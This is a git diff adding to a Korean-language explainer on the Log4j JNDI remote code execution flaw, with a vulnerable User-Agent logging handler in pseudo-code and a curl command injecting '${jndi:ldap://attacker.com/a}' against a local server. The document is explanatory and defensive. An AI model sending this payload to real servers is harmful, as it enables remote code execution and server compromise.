@@ -85,6 +85,43 @@ log4j가 설치된 경로의 pom.xml 파일을 열어 "log4j-core"로 검색
 예로 아래와 같은 소스코드가 실행이 가능하다 
 
 ```
-DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/datasource"); assertNotNull(ds.getConnection());
+DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/datasource");
+assertNotNull(ds.getConnection());
 ```
 
+![image](https://user-images.githubusercontent.com/62640332/160330119-327b75d5-d130-4ba2-8e00-6dd695e18650.png)
+
+- Log4J 에서 JNDI 호출
+
+특정 버전의 Log4J에서 JNDI를 포함한 쿼리를 호출하는 경우 내부적으로 객체를 lookup 하는 기능이 있었다.
+
+특정 버전에서 Log4J 함수로 특정한 쿼리를 실행하면 JNDI를 실행한다. 그래서 단순한 로그만 출력해도 아래 그림처럼 시스템 내부의 특정 프로그램을 실행할 수 있게 된다.
+
+아래 그림은 Log4J를 실행해서 원격 서버의 프로그램이 실행된 예다.
+
+![image](https://user-images.githubusercontent.com/62640332/160330264-db894897-66c0-4101-be5b-cf2f948ac896.png)
+
+그래도 출력하는 로그가 하드 코딩돼서 실행중에 바뀌지 않는다면 문제는 없다. 직접 로그 안에 JNDI를 심어두는 일은 거의 없을 거니까. 그런데 서버 프로그래밍을 하다 보면 사용자가 갖고 있는 정보나 URL의 파라미터를 출력하게 되는 경우도 종종 생긴다. 만약 해커가 로그를 출력하는 부분을 파악해 해당 api에 의도적으로 JNDI LDAP 정보를 심어 넣는다면 외부에서 코드를 실행할 수 있게 된다.
+
+```
+public class VulnerableLog4jExampleHandler implements HttpHandler { static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
+/** * A simple HTTP endpoint that reads the request's User Agent and logs it back.
+* This is basically pseudo-code to explain the vulnerability, and not a full example.
+* @param he HTTP Request Object */ 
+public void handle(HttpExchange he) throws IOException { String userAgent = he.getRequestHeader("user-agent");
+// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
+// The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
+
+log.info("Request User Agent:{}", userAgent); ... } }
+```
+
+위의 코드를 보면 사용자의 user-agent 정보를 log.info 로 출력한다. 디버깅 용도로 이런 로그 한번 쯤은 찍어두게 했을 것이다. 그런데 만약 해커가 User-Agent를 이렇게 바꿨다고 해보자 
+
+```
+curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://attacker.com/a}'
+```
+그러면 User-Agent를 출력하는 코드가 영락 없이 JNDI를 호출하는 코드가 실행되고 해커의 서버에선(attacker.com) 우리의 서버와 JNDI를 통해서 내부 라이브러리를 실행할 수 있게 된다.
+
+[출처]
+1. kisa log4j 보안 취약점 가이드
+2. https://selfish-developer.com/entry/log4j-%EC%9D%B4%EC%8A%88-%EC%82%B4%ED%8E%B4%EB%B3%B4%EA%B8%B0
